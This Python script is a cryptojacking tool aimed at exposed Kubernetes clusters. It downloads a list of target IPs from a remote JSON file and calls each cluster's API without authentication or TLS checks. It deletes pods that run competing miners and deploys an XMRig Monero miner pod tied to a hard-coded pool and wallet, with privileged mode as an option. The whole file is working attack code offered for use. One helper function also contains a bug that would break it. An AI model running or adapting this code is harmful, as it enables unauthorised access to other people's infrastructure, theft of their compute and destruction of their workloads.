import time
from datetime import datetime
import requests
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init
import json
import urllib3
import os

# --- Configuration ---
DOCKER_KEYWORDS_DELETE = ["xmrig", "miner", "xmr", "unmineable"]
IPS_URL = 'https://thev1gilante.github.io/K_ips.json'

MINING_IMAGE = "ghcr.io/murf2/xmrig.docker:latest"
POOL_URL = "gulf.moneroocean.stream:10128"
POOL_USER = "45nqWWu8CV6WuNpEhbNAu4DWTmfUQBxRCWdND6iQVXyAL3cNNTeQoUWCmMzcaScdnJXJY3ttWxwJy9boywbN2XCn8Ejig1s"
POOL_PASS = "x"
COIN = "xmr"

CHECK_INTERVAL = 10  # seconds
K_IPS_FILE = "k_ips.json"

# Disable SSL warnings (due to self-signed certificates in Kubernetes clusters)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

def fetch_k8s_ips():
    """Fetch the latest IPs from the website"""
    try:
        response = requests.get(IPS_URL)
        response.raise_for_status()
        data = response.json()
        return data.get("ips", [])
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[Error] Failed to fetch IP list: {e}")
    return []

def load_existing_ips():
    """Load IPs from k_ips.json"""
    if os.path.exists(K_IPS_FILE):
        with open(K_IPS_FILE, 'r') as f:
            return json.load(f)
    return []

def save_ips_to_json(ips):
    """Save IPs to k_ips.json"""
    with open(K_IPS_FILE, 'w') as f:
        json.dump(ips, f)

def get_k8s_pods(api_url):
    try:
        response = requests.get(f"{api_url}/api/v1/pods", verify=False)
        response.raise_for_status()
        pods = response.json().get("items", [])
        return pods
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[Error] Failed to fetch pods from {api_url}: {e}")
    return []

def delete_k8s_pod(api_url, namespace, pod_name):
    try:
        response = requests.delete(f"{api_url}/api/v1/namespaces/{namespace}/pods/{pod_name}", verify=False)
        response.raise_for_status()
        print(f"{Fore.GREEN}[Removed] Pod: {pod_name}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[Error] Failed to delete pod {pod_name}: {e}")

def is_mining_pod_exists(pod_list):
    """Check if there is any existing mining pod."""
    for pod in pod_list.items:
        if 'miner-' in pod.metadata.name:
            return True
    return False

def create_miner_pod(api_url, namespace, ip):
    pod_name = f"miner-{ip}-system312-{datetime.now().strftime('%Y%m%d%H%M%S')}"
    pods = get_k8s_pods(api_url)
    
    # Check if there is already a mining pod
    if is_mining_pod_exists(pods):
        print(f"{Fore.GREEN}[Info] A mining pod with the IP {ip} already exists. Skipping creation.")
        return
    
    # List to keep track of pods that will be removed (old miners)
    pods_to_remove = []

    for pod in pods:
        existing_pod_name = pod["metadata"]["name"]
        if pod_name in existing_pod_name:
            print(f"{Fore.GREEN}[Info] Skipping pod creation. A miner pod with the IP {ip} already exists.")
            return
        
        if existing_pod_name.startswith("miner-"):
            print(f"{Fore.RED}[Warning] Found another miner pod: {existing_pod_name}")
            pods_to_remove.append((pod["metadata"]["namespace"], existing_pod_name))

    # Kill other miner pods (but not the current one we want to create)
    for namespace, pod_to_remove in pods_to_remove:
        delete_k8s_pod(api_url, namespace, pod_to_remove)

    # Now create the new miner pod
    pod_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {
            "name": pod_name,
            "labels": {
                "owner": "mine",  # Use a label to uniquely identify your miner pods
            }
        },
        "spec": {
            "containers": [{
                "name": "miner",
                "image": MINING_IMAGE,
                "env": [
                    {"name": "POOL_URL", "value": POOL_URL},
                    {"name": "POOL_USER", "value": f"{POOL_USER}.{pod_name}"},
                    {"name": "POOL_PASS", "value": POOL_PASS},
                    {"name": "COIN", "value": COIN},
                    {"name": "WORKERNAME", "value": pod_name},
                ]
            }]
        }
    }

    # Only enable privileged mode if it's absolutely necessary (you can customize this condition)
    privileged_mode = os.getenv('ENABLE_PRIVILEGED_MODE', 'false').lower() == 'true'

    if privileged_mode:
        # If privileged mode is enabled in environment variables, enable it for the pod
        pod_manifest["spec"]["containers"][0]["securityContext"] = {
            "privileged": True
        }
        print(f"{Fore.RED}[Warning] Privileged mode enabled for pod: {pod_name}")
    else:
        print(f"{Fore.GREEN}[Info] Privileged mode disabled for pod: {pod_name}")

    try:
        response = requests.post(f"{api_url}/api/v1/namespaces/{namespace}/pods", json=pod_manifest, verify=False)
        response.raise_for_status()
        print(f"{Fore.GREEN}[Created] Miner pod: {pod_name}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[Error] Failed to create pod {pod_name}: {e}")

def is_own_pod(pod_name, pod_labels):
    # Identify own pods based on a unique label
    if pod_labels.get('owner') == 'mine':
        return True
    if pod_name.startswith("miner-"):
        return True
    return False

def process_k8s_host(ip):
    print(f"\n{Fore.CYAN}=== [Processing Kubernetes Host: {ip}] ===")
    api_url = f"https://{ip}:6443"
    
    pods = get_k8s_pods(api_url)
    if pods:
        print(f"{Fore.LIGHTBLUE_EX}[Info] Pods fetched from Kubernetes API:")
        for pod in pods:
            pod_name = pod["metadata"]["name"]
            namespace = pod["metadata"]["namespace"]
            labels = pod["metadata"].get("labels", {})
            print(f"# Pod Name: {pod_name}")
            
            if is_own_pod(pod_name, labels):
                print(f"{Fore.GREEN}[Info] Skipping own pod: {pod_name}")
                continue

            containers = pod.get("spec", {}).get("containers", [])
            for container in containers:
                image_tag = container.get("image", "").lower()
                if any(keyword in image_tag for keyword in DOCKER_KEYWORDS_DELETE):
                    print(f"{Fore.RED}[Alert] Suspicious container found: {pod_name}")
                    delete_k8s_pod(api_url, namespace, pod_name)
                    break

        # Create the new miner pod (or skip if it already exists)
        create_miner_pod(api_url, "default", ip)
    else:
        print(f"{Fore.RED}[Error] No pods found.")

def main():
    while True:
        cycle_start = datetime.now()
        print(f"\n{Fore.MAGENTA}=== [Cycle Start: {cycle_start.strftime('%Y-%m-%d %H:%M:%S')}] ===")

        # Load the existing IPs from k_ips.json
        existing_ips = load_existing_ips()

        # Fetch the latest IPs from the website
        k8s_ips = fetch_k8s_ips()
        if not k8s_ips:
            print(f"{Fore.RED}[Error] No Kubernetes IPs found. Retrying in 60 seconds...")
            time.sleep(60)
            continue

        # Combine new IPs from the website and the existing IPs, removing duplicates
        all_ips = list(set(existing_ips + k8s_ips))

        # Process each IP in the list
        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(process_k8s_host, all_ips)

        # Save the updated IP list to k_ips.json
        save_ips_to_json(all_ips)

        cycle_end = datetime.now()
        print(f"\n{Fore.MAGENTA}=== [Cycle Complete: {cycle_end.strftime('%Y-%m-%d %H:%M:%S')}] ===")
        print(f"{Fore.YELLOW}Cycle Duration: {cycle_end - cycle_start}")
        print(f"{Fore.CYAN}Sleeping for {CHECK_INTERVAL} seconds...\n")

        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()
